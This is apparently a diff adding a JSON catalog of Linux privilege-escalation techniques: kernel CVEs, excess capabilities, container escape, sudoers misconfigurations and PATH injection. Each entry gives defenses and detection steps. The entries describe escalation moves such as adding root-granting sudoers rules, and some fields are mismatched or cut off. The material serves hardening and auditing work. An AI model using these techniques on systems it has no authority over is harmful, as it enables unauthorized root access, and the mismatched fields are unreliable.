@@ -1,0 +1,3452 @@
+[
+  {
+    "technique_id": "L4.1.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Elevation of Privilege by Using the Core Subsystem Vulnerabilities > Linux Kernel XFRM Privilege Elevation",
+    "description": "CVE-2017-16939",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Upgrade Linux to version 4.13.11 or later.",
+      "Patch management and timely kernel updates",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Use the vulnerability scanning tool to perform tests and upgrade related software versions in a timely manner to solve vulnerabilities.",
+      "Monitor for unusual kernel module loading (insmod, modprobe)",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Kernel Exploit"
+    ],
+    "code_examples_patterns": [
+      "Exploit kernel vulnerability via crafted IOCTL or system call"
+    ],
+    "related_tools": [
+      "Shenanigans Labs",
+      "ExploitDB",
+      "searchsploit"
+    ],
+    "url": "https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.1.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Elevation of Privilege by Using the Core Subsystem Vulnerabilities > Elevation of Privilege Caused by Linux eBPF Vulnerability",
+    "description": "CVE-2020-8835",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code"
+    ],
+    "potential_defenses": [
+      "Linux has been upgraded to versions 5.6.1, 5.5.14, and 5.4.29.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Use the vulnerability scanning tool to perform tests and upgrade related software versions in a timely manner to solve vulnerabilities.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Kernel Exploit"
+    ],
+    "code_examples_patterns": [
+      "Exploit kernel vulnerability via crafted IOCTL or system call"
+    ],
+    "related_tools": [
+      "Pwn2Own 2020 competition"
+    ],
+    "url": "https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.1.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Privilege Escalation Based on LKM Vulnerabilities > Exploiting vulnerabilities in device drivers for privilege escalation",
+    "description": "Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring the following commands: modprobe, insmod, lsmod, rmmod, or modinfo. The LKM typically loads the /lib/modules and the Linux kernel since version 2.6 has the extension .ko (\"kernel object\").",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Kernel Module Compilation Tools"
+    ],
+    "potential_defenses": [
+      "Application whitelisting and software restriction tools (e.g., SELinux) can also help restrict the loading of kernel modules. 2.",
+      "Restrict access to the root account and prevent users from loading kernel modules and extensions by implementing appropriate privilege separation and limiting opportunities for privilege escalation.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Common tools used for detecting Linux rootkits include: rkhunter, chrootkit. Although rootkits may be designed to evade certain detection tools.",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Kernel Exploit"
+    ],
+    "code_examples_patterns": [
+      "Load malicious kernel module via insmod for root-level code execution"
+    ],
+    "related_tools": [
+      "Skidmap",
+      "MITRE Kernel Modules and Extensions"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.2.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "setcap has been used to grant unnecessary capabilities. > setcap grants permissions that exceed the capabilities of a process.",
+    "description": "If the process (for example, only the capability of binding ports) is assigned unnecessary capabilities, you can use these capabilities to: 1) Change the ownership of other user files 2) Insert and remove kernel modules (3) Kill the process that does not belong to itself. 4) Modify the user ID and group ID.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Kernel Module Compilation Tools"
+    ],
+    "potential_defenses": [
+      "setcap grants the minimum permissions required to complete a task.",
+      "Minimize Linux capabilities; avoid CAP_SYS_ADMIN",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the server as the root user, run the ps command to view the PID to be tested, and run the cat /proc/PID/status command. Run the grep'Cap' command to query the corresponding capability set. 2.",
+      "Run the capsh command to convert the capability set into a readable format. Run the capsh --decode command to view the permission of the current process. Pay special attention to whether the CapEff capability set is mandatory for the current process.",
+      "Monitor capability assignments via auditd; alert on CAP_SYS_ADMIN grants",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Token Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Abuse excessive Linux capabilities (e.g., CAP_SYS_ADMIN) for privilege escalation",
+      "Use capsh --decode to analyze process capability sets"
+    ],
+    "related_tools": [
+      "vim/getcap/grep",
+      "capsh",
+      "getcap"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.2.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "setcap has been used to grant unnecessary capabilities. > Containers should avoid using CAP_SYS_ADMIN",
+    "description": "When a container is started, --cap-add=sys_admin is carried and the container runs as the root user, causing container escape. 1) Run the docker ps --quiet command.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux",
+      "Container",
+      "Cloud"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Avoid using CAP_SYS_ADMIN",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Run the docker ps --quiet command. xargs docker inspect --format' {{.Id}} CapAdd={{.HostConfig.CapAdd}}' Run the grep SYS_ADMIN command to check the containers that contain --cap-add=sys_admin. 2)",
+      "Run the docker exec -it -u root container ID bash -c \"cat /proc/1/status command for containers that contain the --cap-add=sys_admin parameter one by one. Run the grep Uid command to check whether the container is running as the root user.",
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Token Manipulation",
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Abuse excessive Linux capabilities (e.g., CAP_SYS_ADMIN) for privilege escalation",
+      "Use capsh --decode to analyze process capability sets",
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "vim/getcap/grep",
+      "Cloud Core Network",
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.2.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "setcap has been used to grant high-risk capabilities such as CAP_KILL. > Process: A process that uses high-risk capabilities to access processes and files of users with low permissions.",
+    "description": "If the process uses the high-risk capability, such as CAP_KILL, which applies to other processes, search for the keyword setcap in the code and compare it with the Setcap capability table, or view the corresponding configuration in the background when the program is running. Based on the actual service capability and application scope of the process, test whether the process can kill other irrelevant processes.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "High-risk capabilities granted by setcap, The application scope needs to be limited in the code.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the background as the root user and run the cat /proc/$$/status command to check whether the corresponding process ID has the capability. grep'Cap' follows: cat /proc/11980/status grep \"Cap\" CapInh: 0000000000000000 CapPrm: 00000000ffffffff CapEff: 0000000000a03406 CapBnd: 0000003fffffffff CapAmb: 0000000000000000 2.",
+      "Run the capsh command to escape the process to the readable format. Run the capsh --decode command to view the permission of the current process. capsh --decode=0000000000a03406 0x0000000000a03406=cap_dac_override,cap_dac_read_search,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_admin,cap_sys_nice",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [
+      "vim/getcap/grep"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Users with Low Privileges Can Edit Sudo Configuration Files > Allowing Low-Priority Users to Edit Sudo Configuration Files",
+    "description": "The attacker obtains the permissions of a low-privilege user, modifies the Sudo configuration, and adds \"XXX ALL=(root) ALL\" to it. This allows the attacker to obtain root privileges",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Restrict the permission on the sudo configuration file. Non-root users cannot edit the file.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.2.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Sudo Configuration File Exists High-Risk Commands such as rm > Sudo Configuration File: Configuring Low-Privilege Users to Use Sudo to Execute High-Risk Commands as the Root User",
+    "description": "Attackers obtain low-privileged users and run high-risk commands or scripts that are allowed in the Sudo configuration. This may cause the following problems: 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "The sudo configuration file does not include high-risk commands. For the list of high-risk commands, refer to the \"Sudo Security Configuration Guide.\" Pay attention to the following unconventional privilege escalation commands: iptables, echo, dnsmasq, ip, nsenter, dhcpd, curl, tee, modprobe, insmod",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the permissions of the sudo configuration files (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory)). 3.",
+      "Non-root users must not be able to edit the sudo configuration files.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.2.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Sudo Configuration File Exists High-Risk Commands such as rm > The command or script configured in the Sudo configuration file has no parameter limit.",
+    "description": "Attackers obtain low-privileged users and run commands that are allowed in the Sudo configuration. This may cause the following problems: 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "If the sudo configuration file contains high-risk commands that must be used for business purposes, the operation objects of these high-risk commands can be strictly restricted by configuring command parameters.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the sudo configuration file. (including /etc/sudoers and the referenced configuration files, for example, the configuration files in the /etc/sudoers.d directory)",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.2.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Sudo Configuration File Exists High-Risk Commands such as rm > Commands or Script Parameters Configured in the Sudo Configuration File Can Be Controlled by Low-Priority Users",
+    "description": "An attacker obtains the permissions of a low-privilege user and executes commands that are allowed to be executed in the Sudo configuration. The parameter of this command is a local file path, and the file can be edited by a regular user. This can lead to arbitrary files being escalated for processing",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "If the sudo configuration file contains high-risk commands that must be used for business purposes, then while configuring the command parameters, ensure that the local files and their parent directories in the parameters cannot be controlled by low-privilege users (the file owner is a low-privilege user, or the owner is root but low-privilege users are allowed to edit the files)).",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the sudo configuration file. (including /etc/sudoers and the referenced configuration files, for example, the configuration files in the /etc/sudoers.d directory)",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.2.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Sudo Configuration File Exists High-Risk Commands such as rm > Using Input Parameters to Create High-Risk Commands or Script Parameters Configured in Sudo Configuration Files",
+    "description": "An attacker obtains the permissions of a low-privilege user and executes commands that are allowed to be executed in the Sudo configuration. If the script uses input parameters to construct commands, or uses input parameters as the operating objects of dangerous commands, it may be used beyond the intended permissions",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "In the sudo configuration file, the scripts/programs configured do not use the parameters of the scripts/programs entered by the user to construct dangerous operation commands.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the content of the sudo configuration file (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory). 3.",
+      "Use the command \"ls -al\" to check the local file attributes in the high-risk command parameters. 4.",
+      "Use the command \"ls -ld\" to check the parent directory attributes of the file.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.3.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Common Privilege Escalation Script Exists in the Sudo Configuration File > Configure scripts/programs that can be edited by low-privilege users, and execute them using sudo to the root user.",
+    "description": "An attacker obtains the permissions of a low-privilege user and executes scripts or programs that are allowed to run in the Sudo configuration. If the owner of the script or program is a low-privilege user, or if the file permissions allow the low-privilege user to edit the file, then the low-privilege user can inject arbitrary commands into the script or program and execute them with root user privileges, thereby achieving privilege escalation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "In the sudo configuration file, the scripts/programs configured must not be controlled by low-privilege users. This includes the scripts/programs themselves and their parent directories. (The file owner is a low-privilege user, or the owner is root but low-privilege users are allowed to edit the file.))",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the content of the sudo configuration file (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory). 3.",
+      "Review and analyze the script logic configured in sudo one by one. First, determine whether the script has any input parameters. If there are input parameters, analyze how the parameters are used and whether there is any construction of dangerous commands.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.3.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Common Privilege Escalation Script Exists in the Sudo Configuration File > In a script executed by sudo to root, a file referenced is one that can be edited by users with lower privileges.",
+    "description": "An attacker obtains the permissions of a low-privilege user and executes scripts or programs that are allowed to run according to the Sudo configuration. If the permissions of the script or program itself are correctly configured, but the other files referenced in the script or program are owned by a low-privilege user, or the file permissions allow the low-privilege user to edit them, then it may be possible for the low-privilege user to inject arbitrary commands into the script or program based on the script logic, and execute them with root user permissions, thereby achieving privilege escalation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "In the sudo configuration file, the scripts/programs configured therein, as well as the files referenced by these scripts/programs and their parent directories, must not be controlled by low-privilege users. (The file owner is a low-privilege user, or the owner is root but low-privilege users are allowed to edit the file.))",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2 Check the content of the sudo configuration file (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory). 3 Review and analyze each script or program configured in sudo, and determine whether there are any file references. Common reference methods include: 1)",
+      "Shell scripts:. or source to reference other scripts, nohup or sh to execute other scripts, cat to read the content of other files. 2)",
+      "Python scripts: import to reference variables in other scripts. 4 Check the ownership and operation permissions of the referenced files and their parent directories.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.4.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The wildcard * exists in the sudo configuration file. > Use wildcard * in the configuration command path of the Sudo configuration file.",
+    "description": "In the sudo configuration file, if a low-privilege user is configured to sudo to the root user to execute all scripts or programs in a certain directory, it may lead to excessive authorization and increase the system's attack surface. For example, configuring XXX ALL=(root) NOPASSWD:/usr/bin/*",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "The command path configured in the Sudo configuration file is accurate to the command itself.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Avoid wildcards in sudo configurations; specify exact command paths",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2 Check the content of the sudo configuration file (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory). 3 View the paths of the scripts or programs configured in sudo.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Alert on sudo commands with wildcard paths in arguments",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation",
+      "Exploit sudo wildcard misconfiguration for arbitrary command execution"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.4.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "The wildcard * exists in the sudo configuration file. > The wildcard * is used as the path in the configuration command of the Sudo configuration file.",
+    "description": "In the sudo configuration file, a low-privilege user can be configured to sudo to the root user to execute a high-risk command or script. If the command parameters include a local file path and use the wildcard *, it may be possible to manipulate any file object, leading to privilege escalation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "If the command parameter configured in the sudo configuration file is a local path, the path is accurate to the file.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Avoid wildcards in sudo configurations; specify exact command paths",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2 Check the content of the sudo configuration file (including /etc/sudoers and the configuration files it references, such as those in the /etc/sudoers.d directory). 3 View the parameters of the scripts or programs configured in sudo.",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Alert on sudo commands with wildcard paths in arguments",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation",
+      "Exploit sudo wildcard misconfiguration for arbitrary command execution"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.5.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Configuring Low-Priority Users to Execute All Commands in the Sudo Configuration File",
+    "description": "If the sudo configuration file contains the following configuration items: ALL ALL=(ALL) ALL, XXX ALL=(root) ALL, and there is no preceding configuration of Defaults targetpw, it will result in any user being able to sudo to the root user and execute arbitrary commands, leading to privilege escalation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Do not configure \"ALL ALL=(ALL) ALL\" or \"XXX ALL=(root) ALL\" in the sudo configuration file, except for the configuration \"Defaults targetpw\" at the beginning.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the sudo configuration file. (including /etc/sudoers and the referenced configuration files, for example, the configuration files in the /etc/sudoers.d directory)",
+      "Audit sudo command execution logs for unauthorized privilege escalation attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Sudo Misconfiguration Abuse"
+    ],
+    "code_examples_patterns": [
+      "Modify /etc/sudoers to add NOPASSWD ALL rule for privilege escalation"
+    ],
+    "related_tools": [
+      "GTFOBins",
+      "sudo -l"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.6.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Privilege Escalation via Environment Variables > Non-root users are not allowed to control the paths configured in the environment variables of the root user.",
+    "description": "If the environment variables of the root user contain directories whose owners are non-root users, or if non-root users have write permissions for these directories, then the non-root user can construct an illegal command under this path. When the root user performs a misoperation, the non-root user can execute the illegal command, thereby completing the privilege escalation operation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Do not configure the environment variables of the root user to include directories whose ownership is not assigned to the root user. Also, do not include directories where non-root users have write permissions, or illegal paths such as \"::\", \":$\", \".:\", etc.",
+      "Harden environment variable inheritance; use secure PATH configurations",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Log in to the operating system as the root user. 2.",
+      "Check the system variables: echo $PATH 3.",
+      "Examine the directory attributes of each path under the system variables one by one, for example: ls -ld /opt/hws/bin, and check the attributes of its parent directory. 4.",
+      "Examine the file attributes of each path under the system variables one by one, for example: ls -al /opt/hws/bin 5.",
+      "Check whether there are any illegal paths in the PATH variable, such as \"::\", \":\", \"$\", \".:\", etc.",
+      "Monitor PATH variable modifications; detect environment variable injection",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Inject malicious binaries into PATH directories for privilege escalation"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.6.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Privilege Escalation via Environment Variables > Low-privilege users escalate privileges by using su root to inherit environment variables.",
+    "description": "When a regular user performs the su root command to switch to the root user, if the operating system is improperly configured, it may cause the root user to inherit the environment variables of the regular user, rather than resetting them to the root user's environment variables. In this case, the regular user may have the permission to construct commands within the environment variables",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Set the configuration parameter ALWAYS_SET_PATH in the server configuration file /etc/default/su to \"yes\".",
+      "Harden environment variable inheritance; use secure PATH configurations",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "A regular user logs into the operating system. 2 Execute echo $PATH and record the value of the environment variable. 3 Execute su root to switch to the root user. 4 Execute echo $PATH again, compare the two values of the environment variable, and check whether the root user's environment variable is the same as that of a regular user.",
+      "Monitor PATH variable modifications; detect environment variable injection",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Token Impersonation"
+    ],
+    "code_examples_patterns": [
+      "Inject malicious binaries into PATH directories for privilege escalation"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "L4.3.7.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Sudo Time Difference Privilege Escalation > Exploiting Time Difference to Achieve Sudo Privilege Escalation",
+    "description": "When a script running as root contains files that can be controlled by low-privilege users, and the script implements a logic of verifying before operating, an attacker can exploit the time difference between the verification and the operation. The attacker can first perform file verification, then construct a soft link file, thereby achieving the goal of operating any file as the root user, and ultimately achieving privilege escalation",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Linux"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access"
+    ],
+    "potential_defenses": [
+      "Do not use the root user in scripts to perform operations on file objects that can be controlled by low-privilege users.",
+      "Principle of least privilege; audit sudoers configuration regularly",
+      "Application control and whitelisting",
